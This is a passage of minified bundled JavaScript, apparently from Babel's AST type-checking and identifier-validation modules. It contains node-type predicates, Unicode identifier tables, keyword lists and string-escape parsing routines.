J==null||(0,D.default)(X,J)}function nv(X,J){if(!X)return!1;switch(X.type){case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":break;case"Placeholder":if(X.expectedNode==="Pattern")break;default:return!1}return J==null||(0,D.default)(X,J)}function sv(X,J){if(!X)return!1;switch(X.type){case"ClassExpression":case"ClassDeclaration":break;default:return!1}return J==null||(0,D.default)(X,J)}function hV(X,J){if(!X)return!1;switch(X.type){case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ImportDeclaration":break;default:return!1}return J==null||(0,D.default)(X,J)}function ov(X,J){if(!X)return!1;switch(X.type){case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":break;default:return!1}return J==null||(0,D.default)(X,J)}function tv(X,J){if(!X)return!1;switch(X.type){case"ExportSpecifier":case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":case"ExportNamespaceSpecifier":case"ExportDefaultSpecifier":break;default:return!1}return J==null||(0,D.default)(X,J)}function ev(X,J){if(!X)return!1;switch(X.type){case"ClassAccessorProperty":break;default:return!1}return J==null||(0,D.default)(X,J)}function Xf(X,J){if(!X)return!1;switch(X.type){case"ClassPrivateProperty":case"ClassPrivateMethod":case"PrivateName":break;default:return!1}return J==null||(0,D.default)(X,J)}function Jf(X,J){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"ArrayTypeAnnotation":case"BooleanTypeAnnotation":case"BooleanLiteralTypeAnnotation":case"NullLiteralTypeAnnotation":case"ClassImplements":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"DeclaredPredicate":case"ExistsTypeAnnotation":case"FunctionTypeAnnotation":case"FunctionTypeParam":case"GenericTypeAnnotation":case"InferredPredicate":case"InterfaceExtends":case"InterfaceDeclaration":case"InterfaceTypeAnnotation":case"IntersectionTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NullableTypeAnnotation":case"NumberLiteralTypeAnnotation":case"NumberTypeAnnotation":case"ObjectTypeAnnotation":case"ObjectTypeInternalSlot":case"ObjectTypeCallProperty":case"ObjectTypeIndexer":case"ObjectTypeProperty":case"ObjectTypeSpreadProperty":case"OpaqueType":case"QualifiedTypeIdentifier":case"StringLiteralTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"TupleTypeAnnotation":case"TypeofTypeAnnotation":case"TypeAlias":case"TypeAnnotation":case"TypeCastExpression":case"TypeParameter":case"TypeParameterDeclaration":case"TypeParameterInstantiation":case"UnionTypeAnnotation":case"Variance":case"VoidTypeAnnotation":case"EnumDeclaration":case"EnumBooleanBody":case"EnumNumberBody":case"EnumStringBody":case"EnumSymbolBody":case"EnumBooleanMember":case"EnumNumberMember":case"EnumStringMember":case"EnumDefaultedMember":case"IndexedAccessType":case"OptionalIndexedAccessType":break;default:return!1}return J==null||(0,D.default)(X,J)}function Qf(X,J){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"ArrayTypeAnnotation":case"BooleanTypeAnnotation":case"BooleanLiteralTypeAnnotation":case"NullLiteralTypeAnnotation":case"ExistsTypeAnnotation":case"FunctionTypeAnnotation":case"GenericTypeAnnotation":case"InterfaceTypeAnnotation":case"IntersectionTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NullableTypeAnnotation":case"NumberLiteralTypeAnnotation":case"NumberTypeAnnotation":case"ObjectTypeAnnotation":case"StringLiteralTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"TupleTypeAnnotation":case"TypeofTypeAnnotation":case"UnionTypeAnnotation":case"VoidTypeAnnotation":case"IndexedAccessType":case"OptionalIndexedAccessType":break;default:return!1}return J==null||(0,D.default)(X,J)}function Yf(X,J){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"BooleanTypeAnnotation":case"NullLiteralTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NumberTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"VoidTypeAnnotation":break;default:return!1}return J==null||(0,D.default)(X,J)}function Wf(X,J){if(!X)return!1;switch(X.type){case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":break;default:return!1}return J==null||(0,D.default)(X,J)}function Gf(X,J){if(!X)return!1;switch(X.type){case"DeclaredPredicate":case"InferredPredicate":break;default:return!1}return J==null||(0,D.default)(X,J)}function Hf(X,J){if(!X)return!1;switch(X.type){case"EnumBooleanBody":case"EnumNumberBody":case"EnumStringBody":case"EnumSymbolBody":break;default:return!1}return J==null||(0,D.default)(X,J)}function zf(X,J){if(!X)return!1;switch(X.type){case"EnumBooleanMember":case"EnumNumberMember":case"EnumStringMember":case"EnumDefaultedMember":break;default:return!1}return J==null||(0,D.default)(X,J)}function $f(X,J){if(!X)return!1;switch(X.type){case"JSXAttribute":case"JSXClosingElement":case"JSXElement":case"JSXEmptyExpression":case"JSXExpressionContainer":case"JSXSpreadChild":case"JSXIdentifier":case"JSXMemberExpression":case"JSXNamespacedName":case"JSXOpeningElement":case"JSXSpreadAttribute":case"JSXText":case"JSXFragment":case"JSXOpeningFragment":case"JSXClosingFragment":break;default:return!1}return J==null||(0,D.default)(X,J)}function Vf(X,J){if(!X)return!1;switch(X.type){case"Noop":case"Placeholder":case"V8IntrinsicIdentifier":break;default:return!1}return J==null||(0,D.default)(X,J)}function Kf(X,J){if(!X)return!1;switch(X.type){case"TSParameterProperty":case"TSDeclareFunction":case"TSDeclareMethod":case"TSQualifiedName":case"TSCallSignatureDeclaration":case"TSConstructSignatureDeclaration":case"TSPropertySignature":case"TSMethodSignature":case"TSIndexSignature":case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSFunctionType":case"TSConstructorType":case"TSTypeReference":case"TSTypePredicate":case"TSTypeQuery":case"TSTypeLiteral":case"TSArrayType":case"TSTupleType":case"TSOptionalType":case"TSRestType":case"TSNamedTupleMember":case"TSUnionType":case"TSIntersectionType":case"TSConditionalType":case"TSInferType":case"TSParenthesizedType":case"TSTypeOperator":case"TSIndexedAccessType":case"TSMappedType":case"TSTemplateLiteralType":case"TSLiteralType":case"TSExpressionWithTypeArguments":case"TSInterfaceDeclaration":case"TSInterfaceBody":case"TSTypeAliasDeclaration":case"TSInstantiationExpression":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSEnumBody":case"TSEnumDeclaration":case"TSEnumMember":case"TSModuleDeclaration":case"TSModuleBlock":case"TSImportType":case"TSImportEqualsDeclaration":case"TSExternalModuleReference":case"TSNonNullExpression":case"TSExportAssignment":case"TSNamespaceExportDeclaration":case"TSTypeAnnotation":case"TSTypeParameterInstantiation":case"TSTypeParameterDeclaration":case"TSTypeParameter":break;default:return!1}return J==null||(0,D.default)(X,J)}function Uf(X,J){if(!X)return!1;switch(X.type){case"TSCallSignatureDeclaration":case"TSConstructSignatureDeclaration":case"TSPropertySignature":case"TSMethodSignature":case"TSIndexSignature":break;default:return!1}return J==null||(0,D.default)(X,J)}function Zf(X,J){if(!X)return!1;switch(X.type){case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSFunctionType":case"TSConstructorType":case"TSTypeReference":case"TSTypePredicate":case"TSTypeQuery":case"TSTypeLiteral":case"TSArrayType":case"TSTupleType":case"TSOptionalType":case"TSRestType":case"TSUnionType":case"TSIntersectionType":case"TSConditionalType":case"TSInferType":case"TSParenthesizedType":case"TSTypeOperator":case"TSIndexedAccessType":case"TSMappedType":case"TSTemplateLiteralType":case"TSLiteralType":case"TSExpressionWithTypeArguments":case"TSImportType":break;default:return!1}return J==null||(0,D.default)(X,J)}function qf(X,J){if(!X)return!1;switch(X.type){case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSTemplateLiteralType":case"TSLiteralType":break;default:return!1}return J==null||(0,D.default)(X,J)}function Bf(X,J){if((0,sJ.default)("isNumberLiteral","isNumericLiteral"),!X)return!1;if(X.type!=="NumberLiteral")return!1;return J==null||(0,D.default)(X,J)}function Mf(X,J){if((0,sJ.default)("isRegexLiteral","isRegExpLiteral"),!X)return!1;if(X.type!=="RegexLiteral")return!1;return J==null||(0,D.default)(X,J)}function jf(X,J){if((0,sJ.default)("isRestProperty","isRestElement"),!X)return!1;if(X.type!=="RestProperty")return!1;return J==null||(0,D.default)(X,J)}function Of(X,J){if((0,sJ.default)("isSpreadProperty","isSpreadElement"),!X)return!1;if(X.type!=="SpreadProperty")return!1;return J==null||(0,D.default)(X,J)}function Ff(X,J){return(0,sJ.default)("isModuleDeclaration","isImportOrExportDeclaration"),hV(X,J)}});var r2=v((mV)=>{Object.defineProperty(mV,"__esModule",{value:!0});mV.default=Wu;var bX=F0();function gV(X){return(0,bX.isMemberExpression)(X)||(0,bX.isMetaProperty)(X)}function Wu(X,J,Q){if(!gV(X))return!1;let Y=Array.isArray(J)?J:J.split("."),W=[],G;for(G=X;gV(G);G=(H=G.object)!=null?H:G.meta){var H;W.push(G.property)}if(W.push(G),W.length<Y.length)return!1;if(!Q&&W.length>Y.length)return!1;for(let z=0,$=W.length-1;z<Y.length;z++,$--){let V=W[$],K;if((0,bX.isIdentifier)(V))K=V.name;else if((0,bX.isStringLiteral)(V))K=V.value;else if((0,bX.isThisExpression)(V))K="this";else if((0,bX.isSuper)(V))K="super";else if((0,bX.isPrivateName)(V))K="#"+V.id.name;else return!1;if(Y[z]!==K)return!1}return!0}});var a2=v((uV)=>{Object.defineProperty(uV,"__esModule",{value:!0});uV.default=zu;var Hu=r2();function zu(X,J){let Q=X.split(".");return(Y)=>(0,Hu.default)(Y,Q,J)}});var pV=v((cV)=>{Object.defineProperty(cV,"__esModule",{value:!0});cV.default=void 0;var Vu=a2(),Ku=(0,Vu.default)("React.Component"),qm1=cV.default=Ku});var iV=v((dV)=>{Object.defineProperty(dV,"__esModule",{value:!0});dV.default=Uu;function Uu(X){return!!X&&/^[a-z]/.test(X)}});var p5=v((aV)=>{Object.defineProperty(aV,"__esModule",{value:!0});aV.default=qu;var rV=I9();function qu(X,J){if(X===J)return!0;if(X==null)return!1;if(rV.ALIAS_KEYS[J])return!1;let Q=rV.FLIPPED_ALIAS_KEYS[J];if(Q!=null&&Q.includes(X))return!0;return!1}});var n2=v((nV)=>{Object.defineProperty(nV,"__esModule",{value:!0});nV.default=ju;var Mu=I9();function ju(X,J){if(X===J)return!0;let Q=Mu.PLACEHOLDERS_ALIAS[X];if(Q!=null&&Q.includes(J))return!0;return!1}});var u8=v((sV)=>{Object.defineProperty(sV,"__esModule",{value:!0});sV.default=wu;var Fu=l5(),Ru=p5(),Au=n2(),Du=I9();function wu(X,J,Q){if(!J)return!1;if(!(0,Ru.default)(J.type,X)){if(!Q&&J.type==="Placeholder"&&X in Du.FLIPPED_ALIAS_KEYS)return(0,Au.default)(J.expectedNode,X);return!1}if(Q===void 0)return!0;else return(0,Fu.default)(J,Q)}});var QK=v((JK)=>{Object.defineProperty(JK,"__esModule",{value:!0});JK.isIdentifierChar=XK;JK.isIdentifierName=Pu;JK.isIdentifierStart=eV;var o2="ªµºÀ-ÖØ-öø-ˁˆ-ˑˠ-ˤˬˮͰ-ʹͶͷͺ-ͽͿΆΈ-ΊΌΎ-ΡΣ-ϵϷ-ҁҊ-ԯԱ-Ֆՙՠ-ֈא-תׯ-ײؠ-يٮٯٱ-ۓەۥۦۮۯۺ-ۼۿܐܒ-ܯݍ-ޥޱߊ-ߪߴߵߺࠀ-ࠕࠚࠤࠨࡀ-ࡘࡠ-ࡪࡰ-ࢇࢉ-ࢎࢠ-ࣉऄ-हऽॐक़-ॡॱ-ঀঅ-ঌএঐও-নপ-রলশ-হঽৎড়ঢ়য়-ৡৰৱৼਅ-ਊਏਐਓ-ਨਪ-ਰਲਲ਼ਵਸ਼ਸਹਖ਼-ੜਫ਼ੲ-ੴઅ-ઍએ-ઑઓ-નપ-રલળવ-હઽૐૠૡૹଅ-ଌଏଐଓ-ନପ-ରଲଳଵ-ହଽଡ଼ଢ଼ୟ-ୡୱஃஅ-ஊஎ-ஐஒ-கஙசஜஞடணதந-பம-ஹௐఅ-ఌఎ-ఐఒ-నప-హఽౘ-ౚౝౠౡಀಅ-ಌಎ-ಐಒ-ನಪ-ಳವ-ಹಽೝೞೠೡೱೲഄ-ഌഎ-ഐഒ-ഺഽൎൔ-ൖൟ-ൡൺ-ൿඅ-ඖක-නඳ-රලව-ෆก-ะาำเ-ๆກຂຄຆ-ຊຌ-ຣລວ-ະາຳຽເ-ໄໆໜ-ໟༀཀ-ཇཉ-ཬྈ-ྌက-ဪဿၐ-ၕၚ-ၝၡၥၦၮ-ၰၵ-ႁႎႠ-ჅჇჍა-ჺჼ-ቈቊ-ቍቐ-ቖቘቚ-ቝበ-ኈኊ-ኍነ-ኰኲ-ኵኸ-ኾዀዂ-ዅወ-ዖዘ-ጐጒ-ጕጘ-ፚᎀ-ᎏᎠ-Ᏽᏸ-ᏽᐁ-ᙬᙯ-ᙿᚁ-ᚚᚠ-ᛪᛮ-ᛸᜀ-ᜑᜟ-ᜱᝀ-ᝑᝠ-ᝬᝮ-ᝰក-ឳៗៜᠠ-ᡸᢀ-ᢨᢪᢰ-ᣵᤀ-ᤞᥐ-ᥭᥰ-ᥴᦀ-ᦫᦰ-ᧉᨀ-ᨖᨠ-ᩔᪧᬅ-ᬳᭅ-ᭌᮃ-ᮠᮮᮯᮺ-ᯥᰀ-ᰣᱍ-ᱏᱚ-ᱽᲀ-ᲊᲐ-ᲺᲽ-Ჿᳩ-ᳬᳮ-ᳳᳵᳶᳺᴀ-ᶿḀ-ἕἘ-Ἕἠ-ὅὈ-Ὅὐ-ὗὙὛὝὟ-ώᾀ-ᾴᾶ-ᾼιῂ-ῄῆ-ῌῐ-ΐῖ-Ίῠ-Ῥῲ-ῴῶ-ῼⁱⁿₐ-ₜℂℇℊ-ℓℕ℘-ℝℤΩℨK-ℹℼ-ℿⅅ-ⅉⅎⅠ-ↈⰀ-ⳤⳫ-ⳮⳲⳳⴀ-ⴥⴧⴭⴰ-ⵧⵯⶀ-ⶖⶠ-ⶦⶨ-ⶮⶰ-ⶶⶸ-ⶾⷀ-ⷆⷈ-ⷎⷐ-ⷖⷘ-ⷞ々-〇〡-〩〱-〵〸-〼ぁ-ゖ゛-ゟァ-ヺー-ヿㄅ-ㄯㄱ-ㆎㆠ-ㆿㇰ-ㇿ㐀-䶿一-ꒌꓐ-ꓽꔀ-ꘌꘐ-ꘟꘪꘫꙀ-ꙮꙿ-ꚝꚠ-ꛯꜗ-ꜟꜢ-ꞈꞋ-ꟍꟐꟑꟓꟕ-Ƛꟲ-ꠁꠃ-ꠅꠇ-ꠊꠌ-ꠢꡀ-ꡳꢂ-ꢳꣲ-ꣷꣻꣽꣾꤊ-ꤥꤰ-ꥆꥠ-ꥼꦄ-ꦲꧏꧠ-ꧤꧦ-ꧯꧺ-ꧾꨀ-ꨨꩀ-ꩂꩄ-ꩋꩠ-ꩶꩺꩾ-ꪯꪱꪵꪶꪹ-ꪽꫀꫂꫛ-ꫝꫠ-ꫪꫲ-ꫴꬁ-ꬆꬉ-ꬎꬑ-ꬖꬠ-ꬦꬨ-ꬮꬰ-ꭚꭜ-ꭩꭰ-ꯢ가-힣ힰ-ퟆퟋ-ퟻ豈-舘並-龎ﬀ-ﬆﬓ-ﬗיִײַ-ﬨשׁ-זּטּ-לּמּנּסּףּפּצּ-ﮱﯓ-ﴽﵐ-ﶏﶒ-ﷇﷰ-ﷻﹰ-ﹴﹶ-ﻼＡ-Ｚａ-ｚｦ-ﾾￂ-ￇￊ-ￏￒ-ￗￚ-ￜ",oV="·̀-ͯ·҃-֑҇-ׇֽֿׁׂׅׄؐ-ًؚ-٩ٰۖ-ۜ۟-۪ۤۧۨ-ۭ۰-۹ܑܰ-݊ަ-ް߀-߉߫-߽߳ࠖ-࠙ࠛ-ࠣࠥ-ࠧࠩ-࡙࠭-࡛ࢗ-࢟࣊-ࣣ࣡-ःऺ-़ा-ॏ॑-ॗॢॣ०-९ঁ-ঃ়া-ৄেৈো-্ৗৢৣ০-৯৾ਁ-ਃ਼ਾ-ੂੇੈੋ-੍ੑ੦-ੱੵઁ-ઃ઼ા-ૅે-ૉો-્ૢૣ૦-૯ૺ-૿ଁ-ଃ଼ା-ୄେୈୋ-୍୕-ୗୢୣ୦-୯ஂா-ூெ-ைொ-்ௗ௦-௯ఀ-ఄ఼ా-ౄె-ైొ-్ౕౖౢౣ౦-౯ಁ-ಃ಼ಾ-ೄೆ-ೈೊ-್ೕೖೢೣ೦-೯ೳഀ-ഃ഻഼ാ-ൄെ-ൈൊ-്ൗൢൣ൦-൯ඁ-ඃ්ා-ුූෘ-ෟ෦-෯ෲෳัิ-ฺ็-๎๐-๙ັິ-ຼ່-໎໐-໙༘༙༠-༩༹༵༷༾༿ཱ-྄྆྇ྍ-ྗྙ-ྼ࿆ါ-ှ၀-၉ၖ-ၙၞ-ၠၢ-ၤၧ-ၭၱ-ၴႂ-ႍႏ-ႝ፝-፟፩-፱ᜒ-᜕ᜲ-᜴ᝒᝓᝲᝳ឴-៓៝០-៩᠋-᠍᠏-᠙ᢩᤠ-ᤫᤰ-᤻᥆-᥏᧐-᧚ᨗ-ᨛᩕ-ᩞ᩠-᩿᩼-᪉᪐-᪙᪰-᪽ᪿ-ᫎᬀ-ᬄ᬴-᭄᭐-᭙᭫-᭳ᮀ-ᮂᮡ-ᮭ᮰-᮹᯦-᯳ᰤ-᰷᱀-᱉᱐-᱙᳐-᳔᳒-᳨᳭᳴᳷-᳹᷀-᷿‌‍‿⁀⁔⃐-⃥⃜⃡-⃰⳯-⵿⳱ⷠ-〪ⷿ-゙゚〯・꘠-꘩꙯ꙴ-꙽ꚞꚟ꛰꛱ꠂ꠆ꠋꠣ-ꠧ꠬ꢀꢁꢴ-ꣅ꣐-꣙꣠-꣱ꣿ-꤉ꤦ-꤭ꥇ-꥓ꦀ-ꦃ꦳-꧀꧐-꧙ꧥ꧰-꧹ꨩ-ꨶꩃꩌꩍ꩐-꩙ꩻ-ꩽꪰꪲ-ꪴꪷꪸꪾ꪿꫁ꫫ-ꫯꫵ꫶ꯣ-ꯪ꯬꯭꯰-꯹ﬞ︀-️︠-︯︳︴﹍-﹏０-９＿･",Lu=new RegExp("["+o2+"]"),Iu=new RegExp("["+o2+oV+"]");o2=oV=null;var tV=[0,11,2,25,2,18,2,1,2,14,3,13,35,122,70,52,268,28,4,48,48,31,14,29,6,37,11,29,3,35,5,7,2,4,43,157,19,35,5,35,5,39,9,51,13,10,2,14,2,6,2,1,2,10,2,14,2,6,2,1,4,51,13,310,10,21,11,7,25,5,2,41,2,8,70,5,3,0,2,43,2,1,4,0,3,22,11,22,10,30,66,18,2,1,11,21,11,25,71,55,7,1,65,0,16,3,2,2,2,28,43,28,4,28,36,7,2,27,28,53,11,21,11,18,14,17,111,72,56,50,14,50,14,35,39,27,10,22,251,41,7,1,17,2,60,28,11,0,9,21,43,17,47,20,28,22,13,52,58,1,3,0,14,44,33,24,27,35,30,0,3,0,9,34,4,0,13,47,15,3,22,0,2,0,36,17,2,24,20,1,64,6,2,0,2,3,2,14,2,9,8,46,39,7,3,1,3,21,2,6,2,1,2,4,4,0,19,0,13,4,31,9,2,0,3,0,2,37,2,0,26,0,2,0,45,52,19,3,21,2,31,47,21,1,2,0,185,46,42,3,37,47,21,0,60,42,14,0,72,26,38,6,186,43,117,63,32,7,3,0,3,7,2,1,2,23,16,0,2,0,95,7,3,38,17,0,2,0,29,0,11,39,8,0,22,0,12,45,20,0,19,72,200,32,32,8,2,36,18,0,50,29,113,6,2,1,2,37,22,0,26,5,2,1,2,31,15,0,328,18,16,0,2,12,2,33,125,0,80,921,103,110,18,195,2637,96,16,1071,18,5,26,3994,6,582,6842,29,1763,568,8,30,18,78,18,29,19,47,17,3,32,20,6,18,433,44,212,63,129,74,6,0,67,12,65,1,2,0,29,6135,9,1237,42,9,8936,3,2,6,2,1,2,290,16,0,30,2,3,0,15,3,9,395,2309,106,6,12,4,8,8,9,5991,84,2,70,2,1,3,0,3,1,3,3,2,11,2,0,2,6,2,64,2,3,3,7,2,6,2,27,2,3,2,4,2,0,4,6,2,339,3,24,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,7,1845,30,7,5,262,61,147,44,11,6,17,0,322,29,19,43,485,27,229,29,3,0,496,6,2,3,2,1,2,14,2,196,60,67,8,0,1205,3,2,26,2,1,2,0,3,0,2,9,2,3,2,0,2,0,7,0,5,0,2,0,2,0,2,2,2,1,2,0,3,0,2,0,2,0,2,0,2,0,2,1,2,0,3,3,2,6,2,3,2,3,2,0,2,9,2,16,6,2,2,4,2,16,4421,42719,33,4153,7,221,3,5761,15,7472,16,621,2467,541,1507,4938,6,4191],Cu=[509,0,227,0,150,4,294,9,1368,2,2,1,6,3,41,2,5,0,166,1,574,3,9,9,7,9,32,4,318,1,80,3,71,10,50,3,123,2,54,14,32,10,3,1,11,3,46,10,8,0,46,9,7,2,37,13,2,9,6,1,45,0,13,2,49,13,9,3,2,11,83,11,7,0,3,0,158,11,6,9,7,3,56,1,2,6,3,1,3,2,10,0,11,1,3,6,4,4,68,8,2,0,3,0,2,3,2,4,2,0,15,1,83,17,10,9,5,0,82,19,13,9,214,6,3,8,28,1,83,16,16,9,82,12,9,9,7,19,58,14,5,9,243,14,166,9,71,5,2,1,3,3,2,0,2,1,13,9,120,6,3,6,4,0,29,9,41,6,2,3,9,0,10,10,47,15,343,9,54,7,2,7,17,9,57,21,2,13,123,5,4,0,2,1,2,6,2,0,9,9,49,4,2,1,2,4,9,9,330,3,10,1,2,0,49,6,4,4,14,10,5350,0,7,14,11465,27,2343,9,87,9,39,4,60,6,26,9,535,9,470,0,2,54,8,3,82,0,12,1,19628,1,4178,9,519,45,3,22,543,4,4,5,9,7,3,6,31,3,149,2,1418,49,513,54,5,49,9,0,15,0,23,4,2,14,1361,6,2,16,3,6,2,1,2,4,101,0,161,6,10,9,357,0,62,13,499,13,245,1,2,9,726,6,110,6,6,9,4759,9,787719,239];function s2(X,J){let Q=65536;for(let Y=0,W=J.length;Y<W;Y+=2){if(Q+=J[Y],Q>X)return!1;if(Q+=J[Y+1],Q>=X)return!0}return!1}function eV(X){if(X<65)return X===36;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&Lu.test(String.fromCharCode(X));return s2(X,tV)}function XK(X){if(X<48)return X===36;if(X<58)return!0;if(X<65)return!1;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&Iu.test(String.fromCharCode(X));return s2(X,tV)||s2(X,Cu)}function Pu(X){let J=!0;for(let Q=0;Q<X.length;Q++){let Y=X.charCodeAt(Q);if((Y&64512)===55296&&Q+1<X.length){let W=X.charCodeAt(++Q);if((W&64512)===56320)Y=65536+((Y&1023)<<10)+(W&1023)}if(J){if(J=!1,!eV(Y))return!1}else if(!XK(Y))return!1}return!J}});var zK=v((HK)=>{Object.defineProperty(HK,"__esModule",{value:!0});HK.isKeyword=fu;HK.isReservedWord=YK;HK.isStrictBindOnlyReservedWord=GK;HK.isStrictBindReservedWord=vu;HK.isStrictReservedWord=WK;var t2={keyword:["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete"],strict:["implements","interface","let","package","private","protected","public","static","yield"],strictBind:["eval","arguments"]},Eu=new Set(t2.keyword),ku=new Set(t2.strict),bu=new Set(t2.strictBind);function YK(X,J){return J&&X==="await"||X==="enum"}function WK(X,J){return YK(X,J)||ku.has(X)}function GK(X){return bu.has(X)}function vu(X,J){return WK(X,J)||GK(X)}function fu(X){return Eu.has(X)}});var tJ=v((H6)=>{Object.defineProperty(H6,"__esModule",{value:!0});Object.defineProperty(H6,"isIdentifierChar",{enumerable:!0,get:function(){return e2.isIdentifierChar}});Object.defineProperty(H6,"isIdentifierName",{enumerable:!0,get:function(){return e2.isIdentifierName}});Object.defineProperty(H6,"isIdentifierStart",{enumerable:!0,get:function(){return e2.isIdentifierStart}});Object.defineProperty(H6,"isKeyword",{enumerable:!0,get:function(){return oJ.isKeyword}});Object.defineProperty(H6,"isReservedWord",{enumerable:!0,get:function(){return oJ.isReservedWord}});Object.defineProperty(H6,"isStrictBindOnlyReservedWord",{enumerable:!0,get:function(){return oJ.isStrictBindOnlyReservedWord}});Object.defineProperty(H6,"isStrictBindReservedWord",{enumerable:!0,get:function(){return oJ.isStrictBindReservedWord}});Object.defineProperty(H6,"isStrictReservedWord",{enumerable:!0,get:function(){return oJ.isStrictReservedWord}});var e2=QK(),oJ=zK()});var c8=v(($K)=>{Object.defineProperty($K,"__esModule",{value:!0});$K.default=uu;var XY=tJ();function uu(X,J=!0){if(typeof X!=="string")return!1;if(J){if((0,XY.isKeyword)(X)||(0,XY.isStrictReservedWord)(X,!0))return!1}return(0,XY.isIdentifierName)(X)}});var qK=v((ZK)=>{Object.defineProperty(ZK,"__esModule",{value:!0});ZK.readCodePoint=UK;ZK.readInt=KK;ZK.readStringContents=pu;var lu=function(J){return J>=48&&J<=57},VK={decBinOct:new Set([46,66,69,79,95,98,101,111]),hex:new Set([46,88,95,120])},d5={bin:(X)=>X===48||X===49,oct:(X)=>X>=48&&X<=55,dec:(X)=>X>=48&&X<=57,hex:(X)=>X>=48&&X<=57||X>=65&&X<=70||X>=97&&X<=102};function pu(X,J,Q,Y,W,G){let H=Q,z=Y,$=W,V="",K=null,Z=Q,{length:q}=J;for(;;){if(Q>=q){G.unterminated(H,z,$),V+=J.slice(Z,Q);break}let B=J.charCodeAt(Q);if(du(X,B,J,Q)){V+=J.slice(Z,Q);break}if(B===92){V+=J.slice(Z,Q);let M=iu(J,Q,Y,W,X==="template",G);if(M.ch===null&&!K)K={pos:Q,lineStart:Y,curLine:W};else V+=M.ch;({pos:Q,lineStart:Y,curLine:W}=M),Z=Q}else if(B===8232||B===8233)++Q,++W,Y=Q;else if(B===10||B===13)if(X==="template"){if(V+=J.slice(Z,Q)+`
`,++Q,B===13&&J.charCodeAt(Q)===10)++Q;++W,Z=Y=Q}else G.unterminated(H,z,$);else++Q}return{pos:Q,str:V,firstInvalidLoc:K,lineStart:Y,curLine:W,containsInvalid:!!K}}function du(X,J,Q,Y){if(X==="template")return J===96||J===36&&Q.charCodeAt(Y+1)===123;return J===(X==="double"?34:39)}function iu(X,J,Q,Y,W,G){let H=!W;J++;let z=(V)=>({pos:J,ch:V,lineStart:Q,curLine:Y}),$=X.charCodeAt(J++);switch($){case 110:return z(`
`);case 114:return z("\r");case 120:{let V;return{code:V,pos:J}=JY(X,J,Q,Y,2,!1,H,G),z(V===null?null:String.fromCharCode(V))}case 117:{let V;return{code:V,pos:J}=UK(X,J,Q,Y,H,G),z(V===null?null:String.fromCodePoint(V))}case 116:return z("\t");case 98:return z("\b");case 118:return z("\v");case 102:return z("\f");case 13:if(X.charCodeAt(J)===10)++J;case 10:Q=J,++Y;case 8232:case 8233:return z("");case 56:case 57:if(W)return z(null);else G.strictNumericEscape(J-1,Q,Y);default:if($>=48&&$<=55){let V=J-1,Z=/^[0-7]+/.exec(X.slice(V,J+2))[0],q=parseInt(Z,8);if(q>255)Z=Z.slice(0,-1),q=parseInt(Z,8);J+=Z.length-1;let B=X.charCodeAt(J);if(Z!=="0"||B===56||B===57)if(W)return z(null);else G.strictNumericEscape(V,Q,Y);return z(String.fromCharCode(q))}return z(String.fromCharCode($))}}function JY(X,J,Q,Y,W,G,H,z){let $=J,V;if({n:V,pos:J}=KK(X,J,Q,Y,16,W,G,!1,z,!H),V===null)if(H)z.invalidEscapeSequence($,Q,Y);else J=$-1;return{code:V,pos:J}}function KK(X,J,Q,Y,W,G,H,z,$,V){let K=J,Z=W===16?VK.hex:VK.decBinOct,q=W===16?d5.hex:W===10?d5.dec:W===8?d5.oct:d5.bin,B=!1,M=0;for(let O=0,R=G==null?1/0:G;O<R;++O){let I=X.charCodeAt(J),F;if(I===95&&z!=="bail"){let T=X.charCodeAt(J-1),b=X.charCodeAt(J+1);if(!z){if(V)return{n:null,pos:J};$.numericSeparatorInEscapeSequence(J,Q,Y)}else 